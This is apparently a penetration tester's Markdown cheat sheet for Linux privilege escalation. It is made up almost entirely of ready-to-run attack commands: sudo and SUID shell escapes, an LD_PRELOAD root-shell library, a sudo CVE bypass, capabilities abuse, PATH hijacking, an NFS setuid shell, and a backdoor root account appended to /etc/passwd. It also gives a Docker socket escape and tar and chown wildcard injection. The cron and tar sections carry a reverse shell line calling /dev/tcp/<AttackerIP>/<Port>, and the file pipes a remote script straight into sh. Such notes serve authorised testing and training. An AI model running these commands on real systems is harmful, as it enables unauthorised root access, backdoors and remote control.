---
tags:
  - Foundational
  - Linux
  - Post_Exploitation
  - Privilege_Escalation
---

## Linux Privilege Escalation
resources: [GTFOBins](https://gtfobins.github.io/), [HackTricks Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

> Comprehensive Linux privilege escalation methodology.

## Upgrade to TTY Shell

> Spawn a fully interactive TTY shell from a dumb shell. Enables tab completion, history, job control, and commands like `su`/`sudo`.

### Python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Script
```bash
script -qc /bin/bash /dev/null
```

### Shell Direct
```bash
/bin/bash -i
```

### Perl
```perl
perl -e 'exec "/bin/bash";'
```

### Full TTY Stabilization [optional]
> After spawning TTY, background shell and configure terminal for full interactivity.

```bash
# Press Ctrl+Z after python pty.spawn, then run:
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows <Rows> columns <Cols>
```

## Initial Enumeration

```bash
id
whoami
uname -a
cat /etc/os-release
sudo -l
```

### Services Running as Root
> Check for services running as root that may have shell escape sequences.

```bash
ps aux | grep root
```

## Automated Enumeration

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./pspy64
```

## Sudo Exploitation

> [!warning] If you get "Permission denied" error, check `/var/log/syslog` to see if AppArmor is blocking (enabled by default on Debian 10+).

### Check Sudo Rights
```bash
sudo -l
```

### GTFOBins Shell Escapes
```bash
sudo vim -c ':!/bin/bash'
sudo find /etc -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo env /bin/bash
sudo less /etc/passwd
```

> In less/more/man: `!/bin/bash`

### Sudo vi/vim [alternative]
> Alternative method using `:set shell`.

```bash
sudo vi /allowed/path
:set shell=/bin/sh
:shell
```

### Sudo apt
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### Sudo gcc
```bash
sudo gcc -wrapper /bin/sh,-s .
```

### LD_PRELOAD Exploitation
> If `env_keep+=LD_PRELOAD` in sudo -l:

```c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

### CVE-2019-14287
> If sudo rule: `(ALL, !root) /bin/bash`

```bash
sudo -u#-1 /bin/bash
```

## SUID Exploitation

### Find SUID Binaries
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null
```

> Last command checks common locations only (faster).

### Find SGID Binaries
```bash
find / -perm -2000 -type f 2>/dev/null
```

### GTFOBins SUID Exploitation
> Check [GTFOBins](https://gtfobins.github.io/) for SUID exploitation techniques.

```bash
# Example: find SUID
/usr/bin/find . -exec /bin/sh -p \; -quit
```

```bash
# Example: vim SUID
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## Capabilities Exploitation

### Find Capabilities
```bash
getcap -r / 2>/dev/null
```

### Common Exploitable Capabilities
> [!danger] Dangerous capabilities:
> - **cap_setuid** - Can change UID to root
> - **cap_dac_read_search** - Bypass file read permission checks
> - **cap_dac_override** - Bypass file permission checks

### Python cap_setuid
```bash
# If python has cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl cap_setuid
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## Cron Jobs Exploitation

### Enumerate Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/
crontab -l
```

### Monitor for Cron Execution
```bash
# Use pspy to monitor processes
./pspy64
```

### Writable Cron Scripts
> If cron script is writable, inject reverse shell.

```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1' >> /path/to/cron/script.sh
```

## PATH Hijacking

### Check PATH
```bash
echo $PATH
```

### Writable PATH Directories
```bash
find / -writable 2>/dev/null | grep -E "^/usr/local/sbin|^/usr/local/bin|^/usr/sbin|^/usr/bin|^/sbin|^/bin"
```

### Create Malicious Binary
```bash
# If /tmp is in PATH before /usr/bin
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
```

## Kernel Exploits

### Check Kernel Version
```bash
uname -a
cat /proc/version
```

### Search for Kernel Exploits
```bash
searchsploit linux kernel <version>
```

### Common Kernel Exploits
> [!warning] Kernel exploits can crash the system. Use as last resort.
> - **DirtyCow (CVE-2016-5195)** - Linux Kernel 2.6.22 < 3.9
> - **Dirty Pipe (CVE-2022-0847)** - Linux Kernel 5.8 - 5.16.11
> - **PwnKit (CVE-2021-4034)** - Polkit pkexec

## NFS Exploitation

### Check NFS Exports
```bash
cat /etc/exports
showmount -e <Target>
```

### Mount NFS Share [Local]
```bash
mkdir /tmp/nfs
mount -t nfs <Target>:/share /tmp/nfs
```

### no_root_squash Exploitation
> If `no_root_squash` is set, files created as root on client are root on server.

```bash
# On attacker machine (as root)
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# On target
/share/shell
```

## Writable /etc/passwd

### Check if Writable
```bash
ls -la /etc/passwd
```

### Generate Password Hash
```bash
openssl passwd -1 -salt salt password123
```

### Add Root User
```bash
echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## Docker Escape

### Check if Inside Container
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
```

### Docker Socket Mounted
```bash
ls -la /var/run/docker.sock
```

### Escape via Docker Socket
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Wildcard Injection

### Tar Wildcard
> If script runs `tar cf archive.tar *` as root:

```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

### Chown Wildcard
```bash
touch -- '--reference=/root/.ssh/authorized_keys'
```
